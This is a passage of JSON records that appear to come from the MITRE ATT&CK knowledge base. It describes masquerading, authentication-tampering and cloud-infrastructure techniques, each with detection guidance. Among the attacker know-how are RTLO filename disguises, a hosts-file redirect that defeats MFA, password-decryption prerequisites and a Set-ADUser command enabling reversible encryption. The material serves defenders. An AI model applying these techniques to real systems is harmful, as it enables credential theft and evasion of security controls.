Wizard Spider October 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: Cycraft Chimera April 2020),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: DFIR Report APT35 ProxyShell March 2022),"}
{"ID":"T1036.003","name":"Masquerading: Rename System Utilities","description":"Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing. (Citation: LOLBAS Main Site) It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>). (Citation: Elastic Masquerade Ball) An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke)","url":"https://attack.mitre.org/techniques/T1036/003","created":"10 February 2020","last modified":"07 April 2023","version":"1.1","tactics":"Defense Evasion","detection":"If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Metadata, File: File Modification, Process: Process Metadata","is sub-technique":true,"sub-technique of":"T1036","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: FireEye APT10 Sept 2018),(Citation: F-Secure CozyDuke),(Citation: Kaspersky Lyceum October 2021),(Citation: Cybereason Soft Cell June 2019),(Citation: Qualys LolZarus),(Citation: Twitter ItsReallyNick APT32 pubprn Masquerade),"}
{"ID":"T1036.002","name":"Masquerading: Right-to-Left Override","description":"Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named <code>March 25 \\u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>.(Citation: Infosecinstitute RTLO Technique)\n\nAdversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious File](https://attack.mitre.org/techniques/T1204/002) since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.","url":"https://attack.mitre.org/techniques/T1036/002","created":"10 February 2020","last modified":"14 October 2021","version":"1.1","tactics":"Defense Evasion","detection":"Detection methods should include looking for common formats of RTLO characters within filenames such as <code>\\u202E</code>, <code>[U+202E]</code>, and <code>%E2%80%AE</code>. Defenders should also check their analysis tools to ensure they do not interpret the RTLO character and instead print the true name of the file containing it.","platforms":"Linux, Windows, macOS","data sources":"File: File Metadata","is sub-technique":true,"sub-technique of":"T1036","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Trend Micro Tick November 2019),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: TrendMicro BlackTech June 2017),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Scarlet Mimic Jan 2016),"}
{"ID":"T1036.006","name":"Masquerading: Space after Filename","description":"Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.\n\nFor example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <code>evil.txt </code> (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back).\n\nAdversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.","url":"https://attack.mitre.org/techniques/T1036/006","created":"10 February 2020","last modified":"30 March 2023","version":"1.0","tactics":"Defense Evasion","detection":"It's not common for spaces to be at the end of filenames, so this is something that can easily be checked with file monitoring. From the user's perspective though, this is very hard to notice from within the Finder.app or on the command-line in Terminal.app. Processes executed from binaries containing non-standard extensions in the filename are suspicious.","platforms":"Linux, macOS","data sources":"File: File Metadata","is sub-technique":true,"sub-technique of":"T1036","defenses bypassed":null,"contributors":"Erye Hernandez, Palo Alto Networks","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: synack 2016 review),"}
{"ID":"T1556","name":"Modify Authentication Process","description":"Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).\n\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.","url":"https://attack.mitre.org/techniques/T1556","created":"11 February 2020","last modified":"11 April 2023","version":"2.3","tactics":"Credential Access, Defense Evasion, Persistence","detection":"Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>) and correlate then investigate the DLL files these files reference. \n\nPassword filters will also show up as an autorun and loaded DLL in lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)\n\nMonitor for calls to <code>OpenProcess</code> that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).(Citation: Dell Skeleton) \n\nMonitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.\n\nMonitor for suspicious additions to the /Library/Security/SecurityAgentPlugins directory.(Citation: Xorrior Authorization Plugins)\n\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services. (Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nMonitor property changes in Group Policy that manage authentication mechanisms (i.e. [Group Policy Modification](https://attack.mitre.org/techniques/T1484/001)). The <code>Store passwords using reversible encryption</code> configuration should be set to Disabled. Additionally, monitor and/or block suspicious command/script execution of <code>-AllowReversiblePasswordEncryption $true</code>, <code>Set-ADUser</code> and <code>Set-ADAccountControl</code>. Finally, monitor Fine-Grained Password Policies and regularly audit user accounts and group settings.(Citation: dump_pwd_dcsync)\n","platforms":"Azure AD, Google Workspace, IaaS, Linux, Network, Office 365, SaaS, Windows, macOS","data sources":"Active Directory: Active Directory Object Modification, Application Log: Application Log Content, File: File Creation, File: File Modification, Logon Session: Logon Session Creation, Module: Module Load, Process: OS API Execution, Process: Process Access, User Account: User Account Authentication, User Account: User Account Modification, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Chris Ross @xorrior","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET ForSSHe December 2018),(Citation: ESET Ebury Feb 2014),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Mandiant Azure AD Backdoors),(Citation: Microsoft LSA),(Citation: MagicWeb),(Citation: TechNet Least Privilege),(Citation: Microsoft Securing Privileged Access),(Citation: EnableMPRNotifications),(Citation: store_pwd_rev_enc),(Citation: TechNet Credential Theft)"}
{"ID":"T1556.001","name":"Modify Authentication Process: Domain Controller Authentication","description":"Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. \n\nMalware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.(Citation: Dell Skeleton)","url":"https://attack.mitre.org/techniques/T1556/001","created":"11 February 2020","last modified":"20 April 2021","version":"2.0","tactics":"Credential Access, Defense Evasion, Persistence","detection":"Monitor for calls to <code>OpenProcess</code> that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).(Citation: Dell Skeleton)\n\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g. a user has an active login session but has not entered the building or does not have VPN access). ","platforms":"Windows","data sources":"File: File Modification, Logon Session: Logon Session Creation, Process: OS API Execution, Process: Process Access","is sub-technique":true,"sub-technique of":"T1556","defenses bypassed":null,"contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Dell Skeleton),(Citation: Cycraft Chimera April 2020),(Citation: Microsoft Securing Privileged Access),(Citation: Microsoft LSA),(Citation: TechNet Least Privilege),(Citation: TechNet Credential Theft)"}
{"ID":"T1556.007","name":"Modify Authentication Process: Hybrid Identity","description":"Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  \n\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Azure AD includes three options for synchronizing identities between Active Directory and Azure AD(Citation: Azure AD Hybrid Identity):\n\n* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Azure AD, allowing authentication to Azure AD to take place entirely in the cloud \n* Pass Through Authentication (PTA), in which Azure AD authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory \n* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Azure AD \n\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges. \n\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Azure AD, as well as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation: AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.(Citation: MagicWeb)\n\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Azure AD tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Azure AD environment as any user.(Citation: Mandiant Azure AD Backdoors)","url":"https://attack.mitre.org/techniques/T1556/007","created":"28 September 2022","last modified":"21 October 2022","version":"1.0","tactics":"Credential Access, Defense Evasion, Persistence","detection":null,"platforms":"Azure AD, Google Workspace, IaaS, Office 365, SaaS, Windows","data sources":"Application Log: Application Log Content, File: File Modification, Logon Session: Logon Session Creation, Module: Module Load","is sub-technique":true,"sub-technique of":"T1556","defenses bypassed":null,"contributors":"Praetorian","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: AADInternals Azure AD On-Prem to Cloud),(Citation: MagicWeb),(Citation: Mandiant Azure AD Backdoors),(Citation: MagicWeb)"}
{"ID":"T1556.006","name":"Modify Authentication Process: Multi-Factor Authentication","description":"Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.\n\nOnce adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621), adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.(Citation: Mandiant APT42)(Citation: Azure AD Conditional Access Exclusions)\n\nFor example, modifying the Windows hosts file (`C:\\windows\\system32\\drivers\\etc\\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. (Citation: Russians Exploit Default MFA Protocol - CISA March 2022) \n\nDepending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.(Citation: Russians Exploit Default MFA Protocol - CISA March 2022) ","url":"https://attack.mitre.org/techniques/T1556/006","created":"31 May 2022","last modified":"09 February 2023","version":"1.0","tactics":"Credential Access, Defense Evasion, Persistence","detection":null,"platforms":"Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","data sources":"Active Directory: Active Directory Object Modification, Logon Session: Logon Session Creation, User Account: User Account Authentication, User Account: User Account Modification","is sub-technique":true,"sub-technique of":"T1556","defenses bypassed":"Multi-Factor Authentication","contributors":"Liran Ravich, CardinalOps; Muhammad Moiz Arshad, @5T34L7H","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1556.004","name":"Modify Authentication Process: Network Device Authentication","description":"Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.\n\n[Modify System Image](https://attack.mitre.org/techniques/T1601) may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.(Citation: Mandiant - Synful Knock)","url":"https://attack.mitre.org/techniques/T1556/004","created":"19 October 2020","last modified":"14 December 2021","version":"2.0","tactics":"Credential Access, Defense Evasion, Persistence","detection":"Consider verifying the checksum of the operating system file and verifying the image of the operating system in memory.(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)(Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)\n\nDetection of this behavior may be difficult, detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601).","platforms":"Network","data sources":"File: File Modification","is sub-technique":true,"sub-technique of":"T1556","defenses bypassed":null,"contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Mandiant - Synful Knock),(Citation: Cisco IOS Software Integrity Assurance - TACACS)"}
{"ID":"T1556.008","name":"Modify Authentication Process: Network Provider DLL","description":"Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions.(Citation: Network Provider API) During the logon process, Winlogon (the interactive logon module) sends credentials to the local `mpnotify.exe` process via RPC. The `mpnotify.exe` process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.(Citation: NPPSPY - Huntress)(Citation: NPPSPY Video)(Citation: NPLogonNotify) \n\nAdversaries can configure a malicious network provider DLL to receive credentials from `mpnotify.exe`.(Citation: NPPSPY) Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the `NPLogonNotify()` function.(Citation: NPLogonNotify)\n\nAdversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.(Citation: NPPSPY - Huntress)","url":"https://attack.mitre.org/techniques/T1556/008","created":"30 March 2023","last modified":"04 May 2023","version":"1.0","tactics":"Credential Access, Defense Evasion, Persistence","detection":null,"platforms":"Windows","data sources":"File: File Creation, Process: OS API Execution, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1556","defenses bypassed":null,"contributors":"CrowdStrike Falcon OverWatch; Jai Minton","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: EnableMPRNotifications)"}
{"ID":"T1556.002","name":"Modify Authentication Process: Password Filter DLL","description":"Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)","url":"https://attack.mitre.org/techniques/T1556/002","created":"11 February 2020","last modified":"20 April 2021","version":"2.0","tactics":"Credential Access, Defense Evasion, Persistence","detection":"Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>) and correlate then investigate the DLL files these files reference.\n\nPassword filters will also show up as an autorun and loaded DLL in lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)","platforms":"Windows","data sources":"File: File Creation, Module: Module Load, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1556","defenses bypassed":null,"contributors":"Vincent Le Toux","permissions required":"Administrator, SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Kaspersky ProjectSauron Full Report),"}
{"ID":"T1556.003","name":"Modify Authentication Process: Pluggable Authentication Modules","description":"Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)","url":"https://attack.mitre.org/techniques/T1556/003","created":"26 June 2020","last modified":"17 October 2021","version":"2.0","tactics":"Credential Access, Defense Evasion, Persistence","detection":"Monitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.\n\nLook for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).","platforms":"Linux, macOS","data sources":"File: File Modification, Logon Session: Logon Session Creation","is sub-technique":true,"sub-technique of":"T1556","defenses bypassed":null,"contributors":"George Allen, VMware Carbon Black; Scott Knight, @sdotknight, VMware Carbon Black","permissions required":"root","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET Ebury Oct 2017),(Citation: Trend Micro Skidmap),"}
{"ID":"T1556.005","name":"Modify Authentication Process: Reversible Encryption","description":"An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc)\n\nIf the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:\n\n1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>\n2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>\n3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)\n4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)\n\nWith this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)\n\nAn adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.","url":"https://attack.mitre.org/techniques/T1556/005","created":"13 January 2022","last modified":"10 February 2022","version":"1.0","tactics":"Credential Access, Defense Evasion, Persistence","detection":"Monitor property changes in Group Policy: <code>Computer Configuration\\Windows Settings\\Security Settings\\Account Policies\\Password Policy\\Store passwords using reversible encryption</code>. By default, the property should be set to Disabled.\n\nMonitor command-line usage for <code>-AllowReversiblePasswordEncryption $true</code> or other actions that could be related to malicious tampering of user settings (i.e. [Group Policy Modification](https://attack.mitre.org/techniques/T1484/001)). Furthermore, consider monitoring and/or blocking suspicious execution of Active Directory PowerShell modules, such as <code>Set-ADUser</code> and <code>Set-ADAccountControl</code>, that change account configurations. \n\nMonitor Fine-Grained Password Policies and regularly audit user accounts and group settings.(Citation: dump_pwd_dcsync)","platforms":"Windows","data sources":"Active Directory: Active Directory Object Modification, Command: Command Execution, Script: Script Execution, User Account: User Account Metadata","is sub-technique":true,"sub-technique of":"T1556","defenses bypassed":null,"contributors":null,"permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Microsoft Securing Privileged Access),(Citation: TechNet Least Privilege),(Citation: store_pwd_rev_enc),(Citation: TechNet Credential Theft)"}
{"ID":"T1578","name":"Modify Cloud Compute Infrastructure","description":"An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)","url":"https://attack.mitre.org/techniques/T1578","created":"30 August 2019","last modified":"20 April 2021","version":"1.1","tactics":"Defense Evasion","detection":"Establish centralized logging for the activity of cloud compute infrastructure components. Monitor for suspicious sequences of events, such as the creation of multiple snapshots within a short period of time or the mount of a snapshot to a new instance by a new or unexpected user. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.","platforms":"IaaS","data sources":"Instance: Instance Creation, Instance: Instance Deletion, Instance: Instance Metadata, Instance: Instance Modification, Instance: Instance Start, Instance: Instance Stop, Snapshot: Snapshot Creation, Snapshot: Snapshot Deletion, Snapshot: Snapshot Metadata, Snapshot: Snapshot Modification, Volume: Volume Creation, Volume: Volume Deletion, Volume: Volume Metadata, Volume: Volume Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Mandiant M-Trends 2020)"}
{"ID":"T1578.002","name":"Modify Cloud Compute Infrastructure: Create Cloud Instance","description":"An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may [Create Snapshot](https://attack.mitre.org/techniques/T1578/001) of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect [Data from Local System](https://attack.mitre.org/techniques/T1005) or for [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002).(Citation: Mandiant M-Trends 2020)\n\nCreating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.","url":"https://attack.mitre.org/techniques/T1578/002","created":"14 May 2020","last modified":"08 March 2021","version":"1.1","tactics":"Defense Evasion","detection":"The creation of a new instance or VM is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, the creation of an instance by a new user account or the unexpected creation of one or more snapshots followed by the creation of an instance may indicate suspicious activity.\n\nIn AWS, CloudTrail logs capture the creation of an instance in the <code>RunInstances</code> event, and in Azure the creation of a VM may be captured in Azure activity logs.(Citation: AWS CloudTrail Search)(Citation: Azure Activity Logs) Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of <code>gcloud compute instances create</code> to create a VM.(Citation: Cloud Audit Logs)","platforms":"IaaS","data sources":"Instance: Instance Creation, Instance: Instance Metadata","is sub-technique":true,"sub-technique of":"T1578","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Mandiant M-Trends 2020)"}
{"ID":"T1578.001","name":"Modify Cloud Compute Infrastructure: Create Snapshot","description":"An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004) where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.\n\nAn adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002), mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.(Citation: Mandiant M-Trends 2020)","url":"https://attack.mitre.org/techniques/T1578/001","created":"09 June 2020","last modified":"08 March 2021","version":"1.1","tactics":"Defense Evasion","detection":"The creation of a snapshot is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities such as the creation of one or more snapshots and the restoration of these snapshots by a new user account.\n\nIn AWS, CloudTrail logs capture the creation of snapshots and all API calls for AWS Backup as events. Using the information collected by CloudTrail, you can determine the request that was made, the IP address from which the request was made, which user made the request, when it was made, and additional details.(Citation: AWS Cloud Trail Backup API).\n\nIn Azure, the creation of a snapshot may be captured in Azure activity logs. Backup restoration events can also be detected through Azure Monitor Log Data by creating a custom alert for completed restore jobs.(Citation: Azure - Monitor Logs)\n\nGoogle's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of the <code>gcloud compute instances create</code> command to create a new VM disk from a snapshot.(Citation: Cloud Audit Logs) It is also possible to detect the usage of the GCP API with the <code>\"sourceSnapshot\":</code> parameter pointed to <code>\"global/snapshots/[BOOT_SNAPSHOT_NAME]</code>.(Citation: GCP - Creating and Starting a VM)","platforms":"IaaS","data sources":"Snapshot: Snapshot Creation, Snapshot: Snapshot Metadata","is sub-technique":true,"sub-technique of":"T1578","defenses bypassed":null,"contributors":"Praetorian","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Mandiant M-Trends 2020)"}
